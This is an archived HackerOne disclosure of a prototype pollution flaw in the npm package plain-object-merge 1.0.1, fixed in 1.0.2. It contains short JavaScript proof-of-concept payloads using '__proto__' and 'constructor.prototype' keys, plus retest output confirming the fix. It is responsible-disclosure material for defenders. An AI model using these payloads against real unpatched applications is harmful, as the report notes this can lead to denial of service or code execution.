---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/modification-of-assumed-immutable-data-maid
  - env/web
  - stack/node
  - vuln/code-injection
  - vuln/dos
  - impact/rce
substate: "resolved"
weakness: "Modification of Assumed-Immutable Data (MAID)"
enriched: true
body: true
date: 2021-03-13
submitted: 2020-05-11T22:23:34.390Z
bounty_usd: null
votes: 2
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "d3lla"
source: "https://hackerone.com/reports/871156"
title: "[plain-object-merge] Prototype pollution"
---
# [plain-object-merge] Prototype pollution

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 2 | **Program:** Node.js third-party modules | **Disclosed:** 2021-03-13

- Report: [https://hackerone.com/reports/871156](https://hackerone.com/reports/871156)
- CWE: Modification of Assumed-Immutable Data (MAID)
- Submitted: 2020-05-11T22:23:34.390Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a `prototype pollution` vulnerability in `plain-object-merge` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `plain-object-merge`
**version:** `1.0.1`
**npm page:** `https://www.npmjs.com/package/plain-object-merge`

## Module Description

Extremely fast function optimized for deep merging json-serializable plain objects.

## Module Stats

[20] weekly downloads

# Vulnerability

## Vulnerability Description

The `merge` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `plain-object-merge` module:
    - `npm i plain-object-merge`

Create an object with `__proto__` property and pass it to the `merge` function:
```javascript

const merge = require('plain-object-merge');
const payload =  JSON.parse('{"__proto__":{"polluted":"yes"}}');
const obj = {};
console.log("Before : " + obj.polluted);
merge([{}, payload]);
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F824411}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Timeline

- **Report Filed**
- **2020-05-12** @nochnoidozor: Hi @d3lla,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Triaged**
- **External User Joined**
- **2021-02-11** @fabiospampinato: No clue how HackerOne works, but this is fixed as of plain-object-merge@1.0.2.
- **2021-02-11** @bbe8482aecd24374d13c5de15a0a6: Thank you very much for the update @fabiospampinato.
Can you confirm this @d3lla?
- **2021-02-11** @d3lla: Hi @fabiospampinato and @danielruf ,
@fabiospampinato  thank you for the update.

The change seems to fix the problem. I run the following poc:

```javascript
const merge = require('plain-object-merge');
const obj = {};
console.log("Before : " + obj.polluted);
merge([{}, JSON.parse('{"__proto__":{"polluted":"yes"}}')]);
console.log("After : " + obj.polluted);
merge([{}, JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}')]);
console.log("After : " + obj.polluted);

```

and I was not able to reproduce the previous reported result. Now I obtain:
```console
Before : undefined
After : undefined
After : undefined

```
{F1192411}


Thanks for your time and have a nice day,
d3lla

I tested using the following configurations:
- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.15.4
- NPM VERSION: 6.14.10
- **Report Resolved**
- **Agreed On Going Public**
- **2021-02-11** @bbe8482aecd24374d13c5de15a0a6: @d3lla not sure if I have some more time today.
- **Report Became Public**
